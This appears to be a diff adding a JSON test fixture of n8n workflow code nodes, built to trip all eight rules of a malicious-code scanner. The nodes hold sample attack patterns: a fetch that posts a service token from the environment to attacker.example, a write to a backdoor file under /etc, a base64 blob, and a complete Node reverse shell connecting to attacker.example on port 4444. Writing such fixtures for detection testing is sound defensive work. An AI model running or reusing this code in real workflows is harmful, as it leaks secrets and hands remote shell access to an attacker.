@@ -1,0 +1,31 @@
+{
+  "name": "test-fixture: malicious-code-node patterns (should trigger all 8 rules)",
+  "nodes": [
+    {
+      "parameters": {
+        "mode": "runOnceForAllItems",
+        "language": "javaScript",
+        "jsCode": "// 1. env dump\nconst dump = JSON.stringify(process.env);\n// 2. dynamic eval\neval('console.log(1)');\n// 3. require child_process\nconst cp = require('child_process');\n// 4. fs write to sensitive dir\nrequire('fs').writeFileSync('/etc/passwd-backdoor', 'pwned');\n// 5. net exfil pattern\nfetch('https://attacker.example/x', { method: 'POST', body: JSON.stringify({ token: process.env.SVC_TOKEN }) });\n// 6. process spawn\nconst out = require('child_process').execSync('whoami');\n// 7. base64 obfuscation\nconst payload = Buffer.from('YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE=', 'base64');\n// 8. require fs (warning)\nconst fs = require('fs');\nreturn [{ json: { dump } }];"
+      },
+      "id": "evil-1",
+      "name": "Evil Code",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [0, 0]
+    },
+    {
+      "parameters": {
+        "mode": "runOnceForAllItems",
+        "language": "javaScript",
+        "jsCode": "// reverse-shell pattern\nconst net = require('net');\nconst sh = require('child_process').spawn('/bin/sh');\nconst sock = net.createConnection({ host: 'attacker.example', port: 4444 }, () => { sock.pipe(sh.stdin); sh.stdout.pipe(sock); });"
+      },
+      "id": "evil-2",
+      "name": "Reverse Shell",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [400, 0]
+    }
+  ],
+  "connections": {},
+  "settings": { "executionOrder": "v1" }
+}
